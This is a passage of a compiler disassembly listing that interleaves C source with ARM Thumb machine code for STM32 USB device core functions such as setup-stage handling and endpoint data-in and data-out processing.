  if (pdev->pClass[pdev->classId]->GetHSConfigDescriptor != NULL)
  {
    pdev->pConfDesc = (void *)pdev->pClass[pdev->classId]->GetHSConfigDescriptor(&len);
  }
#else /* Default USE_USB_FS */
  if (pdev->pClass[pdev->classId]->GetFSConfigDescriptor != NULL)
 800af22:	687b      	ldr	r3, [r7, #4]
 800af24:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800af28:	687b      	ldr	r3, [r7, #4]
 800af2a:	32ae      	adds	r2, #174	; 0xae
 800af2c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800af30:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800af32:	2b00      	cmp	r3, #0
 800af34:	d00f      	beq.n	800af56 <USBD_RegisterClass+0x54>
  {
    pdev->pConfDesc = (void *)pdev->pClass[pdev->classId]->GetFSConfigDescriptor(&len);
 800af36:	687b      	ldr	r3, [r7, #4]
 800af38:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800af3c:	687b      	ldr	r3, [r7, #4]
 800af3e:	32ae      	adds	r2, #174	; 0xae
 800af40:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800af44:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800af46:	f107 020e 	add.w	r2, r7, #14
 800af4a:	4610      	mov	r0, r2
 800af4c:	4798      	blx	r3
 800af4e:	4602      	mov	r2, r0
 800af50:	687b      	ldr	r3, [r7, #4]
 800af52:	f8c3 22d0 	str.w	r2, [r3, #720]	; 0x2d0
  }
#endif /* USE_USB_FS */

  /* Increment the NumClasses */
  pdev->NumClasses ++;
 800af56:	687b      	ldr	r3, [r7, #4]
 800af58:	f8d3 32d8 	ldr.w	r3, [r3, #728]	; 0x2d8
 800af5c:	1c5a      	adds	r2, r3, #1
 800af5e:	687b      	ldr	r3, [r7, #4]
 800af60:	f8c3 22d8 	str.w	r2, [r3, #728]	; 0x2d8

  return USBD_OK;
 800af64:	2300      	movs	r3, #0
}
 800af66:	4618      	mov	r0, r3
 800af68:	3710      	adds	r7, #16
 800af6a:	46bd      	mov	sp, r7
 800af6c:	bd80      	pop	{r7, pc}

0800af6e <USBD_Start>:
  *         Start the USB Device Core.
  * @param  pdev: Device Handle
  * @retval USBD Status
  */
USBD_StatusTypeDef USBD_Start(USBD_HandleTypeDef *pdev)
{
 800af6e:	b580      	push	{r7, lr}
 800af70:	b082      	sub	sp, #8
 800af72:	af00      	add	r7, sp, #0
 800af74:	6078      	str	r0, [r7, #4]
#ifdef USE_USBD_COMPOSITE
  pdev->classId = 0U;
#endif /* USE_USBD_COMPOSITE */

  /* Start the low level driver  */
  return USBD_LL_Start(pdev);
 800af76:	6878      	ldr	r0, [r7, #4]
 800af78:	f001 fdca 	bl	800cb10 <USBD_LL_Start>
 800af7c:	4603      	mov	r3, r0
}
 800af7e:	4618      	mov	r0, r3
 800af80:	3708      	adds	r7, #8
 800af82:	46bd      	mov	sp, r7
 800af84:	bd80      	pop	{r7, pc}

0800af86 <USBD_RunTestMode>:
  *         Launch test mode process
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_RunTestMode(USBD_HandleTypeDef *pdev)
{
 800af86:	b480      	push	{r7}
 800af88:	b083      	sub	sp, #12
 800af8a:	af00      	add	r7, sp, #0
 800af8c:	6078      	str	r0, [r7, #4]
  return ret;
#else
  /* Prevent unused argument compilation warning */
  UNUSED(pdev);

  return USBD_OK;
 800af8e:	2300      	movs	r3, #0
#endif /* USBD_HS_TESTMODE_ENABLE */
}
 800af90:	4618      	mov	r0, r3
 800af92:	370c      	adds	r7, #12
 800af94:	46bd      	mov	sp, r7
 800af96:	f85d 7b04 	ldr.w	r7, [sp], #4
 800af9a:	4770      	bx	lr

0800af9c <USBD_SetClassConfig>:
  * @param  cfgidx: configuration index
  * @retval status
  */

USBD_StatusTypeDef USBD_SetClassConfig(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 800af9c:	b580      	push	{r7, lr}
 800af9e:	b084      	sub	sp, #16
 800afa0:	af00      	add	r7, sp, #0
 800afa2:	6078      	str	r0, [r7, #4]
 800afa4:	460b      	mov	r3, r1
 800afa6:	70fb      	strb	r3, [r7, #3]
  USBD_StatusTypeDef ret = USBD_OK;
 800afa8:	2300      	movs	r3, #0
 800afaa:	73fb      	strb	r3, [r7, #15]
        }
      }
    }
  }
#else
  if (pdev->pClass[0] != NULL)
 800afac:	687b      	ldr	r3, [r7, #4]
 800afae:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800afb2:	2b00      	cmp	r3, #0
 800afb4:	d009      	beq.n	800afca <USBD_SetClassConfig+0x2e>
  {
    /* Set configuration and Start the Class */
    ret = (USBD_StatusTypeDef)pdev->pClass[0]->Init(pdev, cfgidx);
 800afb6:	687b      	ldr	r3, [r7, #4]
 800afb8:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800afbc:	681b      	ldr	r3, [r3, #0]
 800afbe:	78fa      	ldrb	r2, [r7, #3]
 800afc0:	4611      	mov	r1, r2
 800afc2:	6878      	ldr	r0, [r7, #4]
 800afc4:	4798      	blx	r3
 800afc6:	4603      	mov	r3, r0
 800afc8:	73fb      	strb	r3, [r7, #15]
  }
#endif /* USE_USBD_COMPOSITE */

  return ret;
 800afca:	7bfb      	ldrb	r3, [r7, #15]
}
 800afcc:	4618      	mov	r0, r3
 800afce:	3710      	adds	r7, #16
 800afd0:	46bd      	mov	sp, r7
 800afd2:	bd80      	pop	{r7, pc}

0800afd4 <USBD_ClrClassConfig>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status: USBD_StatusTypeDef
  */
USBD_StatusTypeDef USBD_ClrClassConfig(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 800afd4:	b580      	push	{r7, lr}
 800afd6:	b084      	sub	sp, #16
 800afd8:	af00      	add	r7, sp, #0
 800afda:	6078      	str	r0, [r7, #4]
 800afdc:	460b      	mov	r3, r1
 800afde:	70fb      	strb	r3, [r7, #3]
  USBD_StatusTypeDef ret = USBD_OK;
 800afe0:	2300      	movs	r3, #0
 800afe2:	73fb      	strb	r3, [r7, #15]
      }
    }
  }
#else
  /* Clear configuration  and De-initialize the Class process */
  if (pdev->pClass[0]->DeInit(pdev, cfgidx) != 0U)
 800afe4:	687b      	ldr	r3, [r7, #4]
 800afe6:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800afea:	685b      	ldr	r3, [r3, #4]
 800afec:	78fa      	ldrb	r2, [r7, #3]
 800afee:	4611      	mov	r1, r2
 800aff0:	6878      	ldr	r0, [r7, #4]
 800aff2:	4798      	blx	r3
 800aff4:	4603      	mov	r3, r0
 800aff6:	2b00      	cmp	r3, #0
 800aff8:	d001      	beq.n	800affe <USBD_ClrClassConfig+0x2a>
  {
    ret = USBD_FAIL;
 800affa:	2303      	movs	r3, #3
 800affc:	73fb      	strb	r3, [r7, #15]
  }
#endif /* USE_USBD_COMPOSITE */

  return ret;
 800affe:	7bfb      	ldrb	r3, [r7, #15]
}
 800b000:	4618      	mov	r0, r3
 800b002:	3710      	adds	r7, #16
 800b004:	46bd      	mov	sp, r7
 800b006:	bd80      	pop	{r7, pc}

0800b008 <USBD_LL_SetupStage>:
  *         Handle the setup stage
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_SetupStage(USBD_HandleTypeDef *pdev, uint8_t *psetup)
{
 800b008:	b580      	push	{r7, lr}
 800b00a:	b084      	sub	sp, #16
 800b00c:	af00      	add	r7, sp, #0
 800b00e:	6078      	str	r0, [r7, #4]
 800b010:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret;

  USBD_ParseSetupRequest(&pdev->request, psetup);
 800b012:	687b      	ldr	r3, [r7, #4]
 800b014:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800b018:	6839      	ldr	r1, [r7, #0]
 800b01a:	4618      	mov	r0, r3
 800b01c:	f001 f8a7 	bl	800c16e <USBD_ParseSetupRequest>

  pdev->ep0_state = USBD_EP0_SETUP;
 800b020:	687b      	ldr	r3, [r7, #4]
 800b022:	2201      	movs	r2, #1
 800b024:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  pdev->ep0_data_len = pdev->request.wLength;
 800b028:	687b      	ldr	r3, [r7, #4]
 800b02a:	f8b3 32b0 	ldrh.w	r3, [r3, #688]	; 0x2b0
 800b02e:	461a      	mov	r2, r3
 800b030:	687b      	ldr	r3, [r7, #4]
 800b032:	f8c3 2298 	str.w	r2, [r3, #664]	; 0x298

  switch (pdev->request.bmRequest & 0x1FU)
 800b036:	687b      	ldr	r3, [r7, #4]
 800b038:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800b03c:	f003 031f 	and.w	r3, r3, #31
 800b040:	2b02      	cmp	r3, #2
 800b042:	d01a      	beq.n	800b07a <USBD_LL_SetupStage+0x72>
 800b044:	2b02      	cmp	r3, #2
 800b046:	d822      	bhi.n	800b08e <USBD_LL_SetupStage+0x86>
 800b048:	2b00      	cmp	r3, #0
 800b04a:	d002      	beq.n	800b052 <USBD_LL_SetupStage+0x4a>
 800b04c:	2b01      	cmp	r3, #1
 800b04e:	d00a      	beq.n	800b066 <USBD_LL_SetupStage+0x5e>
 800b050:	e01d      	b.n	800b08e <USBD_LL_SetupStage+0x86>
  {
    case USB_REQ_RECIPIENT_DEVICE:
      ret = USBD_StdDevReq(pdev, &pdev->request);
 800b052:	687b      	ldr	r3, [r7, #4]
 800b054:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800b058:	4619      	mov	r1, r3
 800b05a:	6878      	ldr	r0, [r7, #4]
 800b05c:	f000 fad4 	bl	800b608 <USBD_StdDevReq>
 800b060:	4603      	mov	r3, r0
 800b062:	73fb      	strb	r3, [r7, #15]
      break;
 800b064:	e020      	b.n	800b0a8 <USBD_LL_SetupStage+0xa0>

    case USB_REQ_RECIPIENT_INTERFACE:
      ret = USBD_StdItfReq(pdev, &pdev->request);
 800b066:	687b      	ldr	r3, [r7, #4]
 800b068:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800b06c:	4619      	mov	r1, r3
 800b06e:	6878      	ldr	r0, [r7, #4]
 800b070:	f000 fb3c 	bl	800b6ec <USBD_StdItfReq>
 800b074:	4603      	mov	r3, r0
 800b076:	73fb      	strb	r3, [r7, #15]
      break;
 800b078:	e016      	b.n	800b0a8 <USBD_LL_SetupStage+0xa0>

    case USB_REQ_RECIPIENT_ENDPOINT:
      ret = USBD_StdEPReq(pdev, &pdev->request);
 800b07a:	687b      	ldr	r3, [r7, #4]
 800b07c:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800b080:	4619      	mov	r1, r3
 800b082:	6878      	ldr	r0, [r7, #4]
 800b084:	f000 fb9e 	bl	800b7c4 <USBD_StdEPReq>
 800b088:	4603      	mov	r3, r0
 800b08a:	73fb      	strb	r3, [r7, #15]
      break;
 800b08c:	e00c      	b.n	800b0a8 <USBD_LL_SetupStage+0xa0>

    default:
      ret = USBD_LL_StallEP(pdev, (pdev->request.bmRequest & 0x80U));
 800b08e:	687b      	ldr	r3, [r7, #4]
 800b090:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800b094:	f023 037f 	bic.w	r3, r3, #127	; 0x7f
 800b098:	b2db      	uxtb	r3, r3
 800b09a:	4619      	mov	r1, r3
 800b09c:	6878      	ldr	r0, [r7, #4]
 800b09e:	f001 fe13 	bl	800ccc8 <USBD_LL_StallEP>
 800b0a2:	4603      	mov	r3, r0
 800b0a4:	73fb      	strb	r3, [r7, #15]
      break;
 800b0a6:	bf00      	nop
  }

  return ret;
 800b0a8:	7bfb      	ldrb	r3, [r7, #15]
}
 800b0aa:	4618      	mov	r0, r3
 800b0ac:	3710      	adds	r7, #16
 800b0ae:	46bd      	mov	sp, r7
 800b0b0:	bd80      	pop	{r7, pc}

0800b0b2 <USBD_LL_DataOutStage>:
  * @param  pdata: data pointer
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_DataOutStage(USBD_HandleTypeDef *pdev,
                                        uint8_t epnum, uint8_t *pdata)
{
 800b0b2:	b580      	push	{r7, lr}
 800b0b4:	b086      	sub	sp, #24
 800b0b6:	af00      	add	r7, sp, #0
 800b0b8:	60f8      	str	r0, [r7, #12]
 800b0ba:	460b      	mov	r3, r1
 800b0bc:	607a      	str	r2, [r7, #4]
 800b0be:	72fb      	strb	r3, [r7, #11]
  USBD_EndpointTypeDef *pep;
  USBD_StatusTypeDef ret = USBD_OK;
 800b0c0:	2300      	movs	r3, #0
 800b0c2:	75fb      	strb	r3, [r7, #23]
  uint8_t idx;

  if (epnum == 0U)
 800b0c4:	7afb      	ldrb	r3, [r7, #11]
 800b0c6:	2b00      	cmp	r3, #0
 800b0c8:	d16e      	bne.n	800b1a8 <USBD_LL_DataOutStage+0xf6>
  {
    pep = &pdev->ep_out[0];
 800b0ca:	68fb      	ldr	r3, [r7, #12]
 800b0cc:	f503 73aa 	add.w	r3, r3, #340	; 0x154
 800b0d0:	613b      	str	r3, [r7, #16]

    if (pdev->ep0_state == USBD_EP0_DATA_OUT)
 800b0d2:	68fb      	ldr	r3, [r7, #12]
 800b0d4:	f8d3 3294 	ldr.w	r3, [r3, #660]	; 0x294
 800b0d8:	2b03      	cmp	r3, #3
 800b0da:	f040 8098 	bne.w	800b20e <USBD_LL_DataOutStage+0x15c>
    {
      if (pep->rem_length > pep->maxpacket)
 800b0de:	693b      	ldr	r3, [r7, #16]
 800b0e0:	689a      	ldr	r2, [r3, #8]
 800b0e2:	693b      	ldr	r3, [r7, #16]
 800b0e4:	68db      	ldr	r3, [r3, #12]
 800b0e6:	429a      	cmp	r2, r3
 800b0e8:	d913      	bls.n	800b112 <USBD_LL_DataOutStage+0x60>
      {
        pep->rem_length -= pep->maxpacket;
 800b0ea:	693b      	ldr	r3, [r7, #16]
 800b0ec:	689a      	ldr	r2, [r3, #8]
 800b0ee:	693b      	ldr	r3, [r7, #16]
 800b0f0:	68db      	ldr	r3, [r3, #12]
 800b0f2:	1ad2      	subs	r2, r2, r3
 800b0f4:	693b      	ldr	r3, [r7, #16]
 800b0f6:	609a      	str	r2, [r3, #8]

        (void)USBD_CtlContinueRx(pdev, pdata, MIN(pep->rem_length, pep->maxpacket));
 800b0f8:	693b      	ldr	r3, [r7, #16]
 800b0fa:	68da      	ldr	r2, [r3, #12]
 800b0fc:	693b      	ldr	r3, [r7, #16]
 800b0fe:	689b      	ldr	r3, [r3, #8]
 800b100:	4293      	cmp	r3, r2
 800b102:	bf28      	it	cs
 800b104:	4613      	movcs	r3, r2
 800b106:	461a      	mov	r2, r3
 800b108:	6879      	ldr	r1, [r7, #4]
 800b10a:	68f8      	ldr	r0, [r7, #12]
 800b10c:	f001 f923 	bl	800c356 <USBD_CtlContinueRx>
 800b110:	e07d      	b.n	800b20e <USBD_LL_DataOutStage+0x15c>
      }
      else
      {
        /* Find the class ID relative to the current request */
        switch (pdev->request.bmRequest & 0x1FU)
 800b112:	68fb      	ldr	r3, [r7, #12]
 800b114:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800b118:	f003 031f 	and.w	r3, r3, #31
 800b11c:	2b02      	cmp	r3, #2
 800b11e:	d014      	beq.n	800b14a <USBD_LL_DataOutStage+0x98>
 800b120:	2b02      	cmp	r3, #2
 800b122:	d81d      	bhi.n	800b160 <USBD_LL_DataOutStage+0xae>
 800b124:	2b00      	cmp	r3, #0
 800b126:	d002      	beq.n	800b12e <USBD_LL_DataOutStage+0x7c>
 800b128:	2b01      	cmp	r3, #1
 800b12a:	d003      	beq.n	800b134 <USBD_LL_DataOutStage+0x82>
 800b12c:	e018      	b.n	800b160 <USBD_LL_DataOutStage+0xae>
        {
          case USB_REQ_RECIPIENT_DEVICE:
            /* Device requests must be managed by the first instantiated class
               (or duplicated by all classes for simplicity) */
            idx = 0U;
 800b12e:	2300      	movs	r3, #0
 800b130:	75bb      	strb	r3, [r7, #22]
            break;
 800b132:	e018      	b.n	800b166 <USBD_LL_DataOutStage+0xb4>

          case USB_REQ_RECIPIENT_INTERFACE:
            idx = USBD_CoreFindIF(pdev, LOBYTE(pdev->request.wIndex));
 800b134:	68fb      	ldr	r3, [r7, #12]
 800b136:	f8b3 32ae 	ldrh.w	r3, [r3, #686]	; 0x2ae
 800b13a:	b2db      	uxtb	r3, r3
 800b13c:	4619      	mov	r1, r3
 800b13e:	68f8      	ldr	r0, [r7, #12]
 800b140:	f000 f9d2 	bl	800b4e8 <USBD_CoreFindIF>
 800b144:	4603      	mov	r3, r0
 800b146:	75bb      	strb	r3, [r7, #22]
            break;
 800b148:	e00d      	b.n	800b166 <USBD_LL_DataOutStage+0xb4>

          case USB_REQ_RECIPIENT_ENDPOINT:
            idx = USBD_CoreFindEP(pdev, LOBYTE(pdev->request.wIndex));
 800b14a:	68fb      	ldr	r3, [r7, #12]
 800b14c:	f8b3 32ae 	ldrh.w	r3, [r3, #686]	; 0x2ae
 800b150:	b2db      	uxtb	r3, r3
 800b152:	4619      	mov	r1, r3
 800b154:	68f8      	ldr	r0, [r7, #12]
 800b156:	f000 f9d4 	bl	800b502 <USBD_CoreFindEP>
 800b15a:	4603      	mov	r3, r0
 800b15c:	75bb      	strb	r3, [r7, #22]
            break;
 800b15e:	e002      	b.n	800b166 <USBD_LL_DataOutStage+0xb4>

          default:
            /* Back to the first class in case of doubt */
            idx = 0U;
 800b160:	2300      	movs	r3, #0
 800b162:	75bb      	strb	r3, [r7, #22]
            break;
 800b164:	bf00      	nop
        }

        if (idx < USBD_MAX_SUPPORTED_CLASS)
 800b166:	7dbb      	ldrb	r3, [r7, #22]
 800b168:	2b00      	cmp	r3, #0
 800b16a:	d119      	bne.n	800b1a0 <USBD_LL_DataOutStage+0xee>
        {
          /* Setup the class ID and route the request to the relative class function */
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b16c:	68fb      	ldr	r3, [r7, #12]
 800b16e:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b172:	b2db      	uxtb	r3, r3
 800b174:	2b03      	cmp	r3, #3
 800b176:	d113      	bne.n	800b1a0 <USBD_LL_DataOutStage+0xee>
          {
            if (pdev->pClass[idx]->EP0_RxReady != NULL)
 800b178:	7dba      	ldrb	r2, [r7, #22]
 800b17a:	68fb      	ldr	r3, [r7, #12]
 800b17c:	32ae      	adds	r2, #174	; 0xae
 800b17e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b182:	691b      	ldr	r3, [r3, #16]
 800b184:	2b00      	cmp	r3, #0
 800b186:	d00b      	beq.n	800b1a0 <USBD_LL_DataOutStage+0xee>
            {
              pdev->classId = idx;
 800b188:	7dba      	ldrb	r2, [r7, #22]
 800b18a:	68fb      	ldr	r3, [r7, #12]
 800b18c:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
              pdev->pClass[idx]->EP0_RxReady(pdev);
 800b190:	7dba      	ldrb	r2, [r7, #22]
 800b192:	68fb      	ldr	r3, [r7, #12]
 800b194:	32ae      	adds	r2, #174	; 0xae
 800b196:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b19a:	691b      	ldr	r3, [r3, #16]
 800b19c:	68f8      	ldr	r0, [r7, #12]
 800b19e:	4798      	blx	r3
            }
          }
        }

        (void)USBD_CtlSendStatus(pdev);
 800b1a0:	68f8      	ldr	r0, [r7, #12]
 800b1a2:	f001 f8e9 	bl	800c378 <USBD_CtlSendStatus>
 800b1a6:	e032      	b.n	800b20e <USBD_LL_DataOutStage+0x15c>
    }
  }
  else
  {
    /* Get the class index relative to this interface */
    idx = USBD_CoreFindEP(pdev, (epnum & 0x7FU));
 800b1a8:	7afb      	ldrb	r3, [r7, #11]
 800b1aa:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800b1ae:	b2db      	uxtb	r3, r3
 800b1b0:	4619      	mov	r1, r3
 800b1b2:	68f8      	ldr	r0, [r7, #12]
 800b1b4:	f000 f9a5 	bl	800b502 <USBD_CoreFindEP>
 800b1b8:	4603      	mov	r3, r0
 800b1ba:	75bb      	strb	r3, [r7, #22]

    if (((uint16_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b1bc:	7dbb      	ldrb	r3, [r7, #22]
 800b1be:	2bff      	cmp	r3, #255	; 0xff
 800b1c0:	d025      	beq.n	800b20e <USBD_LL_DataOutStage+0x15c>
 800b1c2:	7dbb      	ldrb	r3, [r7, #22]
 800b1c4:	2b00      	cmp	r3, #0
 800b1c6:	d122      	bne.n	800b20e <USBD_LL_DataOutStage+0x15c>
    {
      /* Call the class data out function to manage the request */
      if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b1c8:	68fb      	ldr	r3, [r7, #12]
 800b1ca:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b1ce:	b2db      	uxtb	r3, r3
 800b1d0:	2b03      	cmp	r3, #3
 800b1d2:	d117      	bne.n	800b204 <USBD_LL_DataOutStage+0x152>
      {
        if (pdev->pClass[idx]->DataOut != NULL)
 800b1d4:	7dba      	ldrb	r2, [r7, #22]
 800b1d6:	68fb      	ldr	r3, [r7, #12]
 800b1d8:	32ae      	adds	r2, #174	; 0xae
 800b1da:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b1de:	699b      	ldr	r3, [r3, #24]
 800b1e0:	2b00      	cmp	r3, #0
 800b1e2:	d00f      	beq.n	800b204 <USBD_LL_DataOutStage+0x152>
        {
          pdev->classId = idx;
 800b1e4:	7dba      	ldrb	r2, [r7, #22]
 800b1e6:	68fb      	ldr	r3, [r7, #12]
 800b1e8:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->DataOut(pdev, epnum);
 800b1ec:	7dba      	ldrb	r2, [r7, #22]
 800b1ee:	68fb      	ldr	r3, [r7, #12]
 800b1f0:	32ae      	adds	r2, #174	; 0xae
 800b1f2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b1f6:	699b      	ldr	r3, [r3, #24]
 800b1f8:	7afa      	ldrb	r2, [r7, #11]
 800b1fa:	4611      	mov	r1, r2
 800b1fc:	68f8      	ldr	r0, [r7, #12]
 800b1fe:	4798      	blx	r3
 800b200:	4603      	mov	r3, r0
 800b202:	75fb      	strb	r3, [r7, #23]
        }
      }
      if (ret != USBD_OK)
 800b204:	7dfb      	ldrb	r3, [r7, #23]
 800b206:	2b00      	cmp	r3, #0
 800b208:	d001      	beq.n	800b20e <USBD_LL_DataOutStage+0x15c>
      {
        return ret;
 800b20a:	7dfb      	ldrb	r3, [r7, #23]
 800b20c:	e000      	b.n	800b210 <USBD_LL_DataOutStage+0x15e>
      }
    }
  }

  return USBD_OK;
 800b20e:	2300      	movs	r3, #0
}
 800b210:	4618      	mov	r0, r3
 800b212:	3718      	adds	r7, #24
 800b214:	46bd      	mov	sp, r7
 800b216:	bd80      	pop	{r7, pc}

0800b218 <USBD_LL_DataInStage>:
  * @param  epnum: endpoint index
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_DataInStage(USBD_HandleTypeDef *pdev,
                                       uint8_t epnum, uint8_t *pdata)
{
 800b218:	b580      	push	{r7, lr}
 800b21a:	b086      	sub	sp, #24
 800b21c:	af00      	add	r7, sp, #0
 800b21e:	60f8      	str	r0, [r7, #12]
 800b220:	460b      	mov	r3, r1
 800b222:	607a      	str	r2, [r7, #4]
 800b224:	72fb      	strb	r3, [r7, #11]
  USBD_EndpointTypeDef *pep;
  USBD_StatusTypeDef ret;
  uint8_t idx;

  if (epnum == 0U)
 800b226:	7afb      	ldrb	r3, [r7, #11]
 800b228:	2b00      	cmp	r3, #0
 800b22a:	d16f      	bne.n	800b30c <USBD_LL_DataInStage+0xf4>
  {
    pep = &pdev->ep_in[0];
 800b22c:	68fb      	ldr	r3, [r7, #12]
 800b22e:	3314      	adds	r3, #20
 800b230:	613b      	str	r3, [r7, #16]

    if (pdev->ep0_state == USBD_EP0_DATA_IN)
 800b232:	68fb      	ldr	r3, [r7, #12]
 800b234:	f8d3 3294 	ldr.w	r3, [r3, #660]	; 0x294
 800b238:	2b02      	cmp	r3, #2
 800b23a:	d15a      	bne.n	800b2f2 <USBD_LL_DataInStage+0xda>
    {
      if (pep->rem_length > pep->maxpacket)
 800b23c:	693b      	ldr	r3, [r7, #16]
 800b23e:	689a      	ldr	r2, [r3, #8]
 800b240:	693b      	ldr	r3, [r7, #16]
 800b242:	68db      	ldr	r3, [r3, #12]
 800b244:	429a      	cmp	r2, r3
 800b246:	d914      	bls.n	800b272 <USBD_LL_DataInStage+0x5a>
      {
        pep->rem_length -= pep->maxpacket;
 800b248:	693b      	ldr	r3, [r7, #16]
 800b24a:	689a      	ldr	r2, [r3, #8]
 800b24c:	693b      	ldr	r3, [r7, #16]
 800b24e:	68db      	ldr	r3, [r3, #12]
 800b250:	1ad2      	subs	r2, r2, r3
 800b252:	693b      	ldr	r3, [r7, #16]
 800b254:	609a      	str	r2, [r3, #8]

        (void)USBD_CtlContinueSendData(pdev, pdata, pep->rem_length);
 800b256:	693b      	ldr	r3, [r7, #16]
 800b258:	689b      	ldr	r3, [r3, #8]
 800b25a:	461a      	mov	r2, r3
 800b25c:	6879      	ldr	r1, [r7, #4]
 800b25e:	68f8      	ldr	r0, [r7, #12]
 800b260:	f001 f84b 	bl	800c2fa <USBD_CtlContinueSendData>

        /* Prepare endpoint for premature end of transfer */
        (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800b264:	2300      	movs	r3, #0
 800b266:	2200      	movs	r2, #0
 800b268:	2100      	movs	r1, #0
 800b26a:	68f8      	ldr	r0, [r7, #12]
 800b26c:	f001 fe34 	bl	800ced8 <USBD_LL_PrepareReceive>
 800b270:	e03f      	b.n	800b2f2 <USBD_LL_DataInStage+0xda>
      }
      else
      {
        /* last packet is MPS multiple, so send ZLP packet */
        if ((pep->maxpacket == pep->rem_length) &&
 800b272:	693b      	ldr	r3, [r7, #16]
 800b274:	68da      	ldr	r2, [r3, #12]
 800b276:	693b      	ldr	r3, [r7, #16]
 800b278:	689b      	ldr	r3, [r3, #8]
 800b27a:	429a      	cmp	r2, r3
 800b27c:	d11c      	bne.n	800b2b8 <USBD_LL_DataInStage+0xa0>
            (pep->total_length >= pep->maxpacket) &&
 800b27e:	693b      	ldr	r3, [r7, #16]
 800b280:	685a      	ldr	r2, [r3, #4]
 800b282:	693b      	ldr	r3, [r7, #16]
 800b284:	68db      	ldr	r3, [r3, #12]
        if ((pep->maxpacket == pep->rem_length) &&
 800b286:	429a      	cmp	r2, r3
 800b288:	d316      	bcc.n	800b2b8 <USBD_LL_DataInStage+0xa0>
            (pep->total_length < pdev->ep0_data_len))
 800b28a:	693b      	ldr	r3, [r7, #16]
 800b28c:	685a      	ldr	r2, [r3, #4]
 800b28e:	68fb      	ldr	r3, [r7, #12]
 800b290:	f8d3 3298 	ldr.w	r3, [r3, #664]	; 0x298
            (pep->total_length >= pep->maxpacket) &&
 800b294:	429a      	cmp	r2, r3
 800b296:	d20f      	bcs.n	800b2b8 <USBD_LL_DataInStage+0xa0>
        {
          (void)USBD_CtlContinueSendData(pdev, NULL, 0U);
 800b298:	2200      	movs	r2, #0
 800b29a:	2100      	movs	r1, #0
 800b29c:	68f8      	ldr	r0, [r7, #12]
 800b29e:	f001 f82c 	bl	800c2fa <USBD_CtlContinueSendData>
          pdev->ep0_data_len = 0U;
 800b2a2:	68fb      	ldr	r3, [r7, #12]
 800b2a4:	2200      	movs	r2, #0
 800b2a6:	f8c3 2298 	str.w	r2, [r3, #664]	; 0x298

          /* Prepare endpoint for premature end of transfer */
          (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800b2aa:	2300      	movs	r3, #0
 800b2ac:	2200      	movs	r2, #0
 800b2ae:	2100      	movs	r1, #0
 800b2b0:	68f8      	ldr	r0, [r7, #12]
 800b2b2:	f001 fe11 	bl	800ced8 <USBD_LL_PrepareReceive>
 800b2b6:	e01c      	b.n	800b2f2 <USBD_LL_DataInStage+0xda>
        }
        else
        {
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b2b8:	68fb      	ldr	r3, [r7, #12]
 800b2ba:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b2be:	b2db      	uxtb	r3, r3
 800b2c0:	2b03      	cmp	r3, #3
 800b2c2:	d10f      	bne.n	800b2e4 <USBD_LL_DataInStage+0xcc>
          {
            if (pdev->pClass[0]->EP0_TxSent != NULL)
 800b2c4:	68fb      	ldr	r3, [r7, #12]
 800b2c6:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b2ca:	68db      	ldr	r3, [r3, #12]
 800b2cc:	2b00      	cmp	r3, #0
 800b2ce:	d009      	beq.n	800b2e4 <USBD_LL_DataInStage+0xcc>
            {
              pdev->classId = 0U;
 800b2d0:	68fb      	ldr	r3, [r7, #12]
 800b2d2:	2200      	movs	r2, #0
 800b2d4:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
              pdev->pClass[0]->EP0_TxSent(pdev);
 800b2d8:	68fb      	ldr	r3, [r7, #12]
 800b2da:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b2de:	68db      	ldr	r3, [r3, #12]
 800b2e0:	68f8      	ldr	r0, [r7, #12]
 800b2e2:	4798      	blx	r3
            }
          }
          (void)USBD_LL_StallEP(pdev, 0x80U);
 800b2e4:	2180      	movs	r1, #128	; 0x80
 800b2e6:	68f8      	ldr	r0, [r7, #12]
